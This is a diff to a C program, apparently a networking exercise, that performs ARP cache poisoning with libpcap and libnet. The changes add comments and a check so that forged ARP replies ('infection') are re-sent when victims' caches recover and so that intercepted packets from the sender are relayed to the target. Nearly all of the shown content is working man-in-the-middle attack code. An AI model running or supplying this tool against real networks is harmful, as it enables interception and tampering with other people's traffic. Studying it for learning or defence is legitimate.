@@ -31,11 +31,9 @@ void usage(){
 	printf("sample: send_arp ens33 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
 }
 
-
 template <class T> const T& min (const T& a, const T& b) {
   return !(b<a)?a:b;     // or: return !comp(b,a)?a:b; for version (2)
 }
-
 
 bool compare_mac(uint8_t* a, uint8_t* b){
 	for(int i=0; i<6; i++) if(a[i] != b[i]) return false;
@@ -151,10 +149,14 @@ void get_my_addr(const char* dev, uint8_t * my_mac, uint8_t* my_ip){
 	close(s);
 }
 
-bool spoofed(uint8_t* p, uint8_t* sender_mac){
+bool spoofed(uint8_t* p, uint8_t* sender_mac, uint8_t* my_ip){
+	/* check if	1. src mac = sender mac	2. dst ip != my ip */
 	struct libnet_ethernet_hdr * eth_h = (struct libnet_ethernet_hdr *) p;
 	if (compare_mac(eth_h -> ether_shost, sender_mac) == false) return false;
 	if (eth_h -> ether_type != htons(ETHERTYPE_IP)) return false;
+
+	struct libnet_ipv4_hdr * ip_h = (struct libnet_ipv4_hdr *)(eth_h + 1);
+	if ((ip_h -> ip_dst.s_addr) == *(uint32_t*)my_ip) return false;
 	
 	return true;	
 }
@@ -171,6 +173,7 @@ bool relay(pcap_t* handle, uint8_t* p, int p_size,  uint8_t* my_mac, uint8_t* ta
 }
 
 bool recovered(uint8_t* p, uint8_t* sender_mac, uint8_t* target_mac){
+	/* check if	1. src mac = sender mac or target mac	2. ARP packet */
 	struct libnet_ethernet_hdr * eth_h = (struct libnet_ethernet_hdr*) p;
 	if (compare_mac(eth_h -> ether_shost, sender_mac) == false && \
 		compare_mac(eth_h -> ether_shost, target_mac) == false) return false;
@@ -187,11 +190,11 @@ int main(int argc, char * argv[]){
 	
 	char errbuf[PCAP_ERRBUF_SIZE];
 	char * dev = argv[1];
+	int session = (argc-2)/2;
 	uint8_t brdcst_mac[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
 	uint8_t zero_mac[6] = {0x00,0x00,0x00,0x00,0x00,0x00};
 	uint8_t my_mac[6], sender_mac[MAX_SESS_NUM][6], target_mac[MAX_SESS_NUM][6];
 	uint8_t my_ip[4], sender_ip[MAX_SESS_NUM][4], target_ip[MAX_SESS_NUM][4];
-	int session  = (argc-2)/2;
 	
 	pcap_t * handle = pcap_open_live(dev,BUFSIZ,1,1,errbuf);
 	if (handle == NULL) {
@@ -199,9 +202,10 @@ int main(int argc, char * argv[]){
 		return -1;
 	}
 
-	/* get all addresses */
+	/* get my mac & ip addr */
 	get_my_addr(dev, my_mac, my_ip);
 	
+	/* get mac & ip addr of sender & target */
 	for (int n=0; n<session; n++){
 		inet_pton(AF_INET, argv[2*n+2], sender_ip[n]);
 		inet_pton(AF_INET, argv[2*n+3], target_ip[n]);
@@ -211,6 +215,7 @@ int main(int argc, char * argv[]){
 		get_mac(handle, target_mac[n]);
 	}
 
+	/* infection */
 	for (int n=0; n<session; n++)
 		send_arp(handle, ARPOP_REPLY, my_mac, sender_mac[n], my_mac, target_ip[n], sender_mac[n], sender_ip[n]);
 
@@ -221,10 +226,12 @@ int main(int argc, char * argv[]){
 		if (res == 0) continue;
 		if (res == -1 || res == -2) break;
 		for (int n=0; n<session; n++){
+			/* send infection when recovered*/
 			if(recovered((uint8_t*)packet, sender_mac[n], target_mac[n]))
 				send_arp(handle, ARPOP_REPLY, my_mac, sender_mac[n], my_mac, target_ip[n], sender_mac[n], sender_ip[n]);
 			
-			if(spoofed((uint8_t*)packet, sender_mac[n])){
+			/* relay spoofed packet */
+			if(spoofed((uint8_t*)packet, sender_mac[n], my_ip)){
 				relay(handle, (uint8_t*)packet, header->caplen, my_mac, target_mac[n]);
 				print_packet((uint8_t*)packet);
 			}
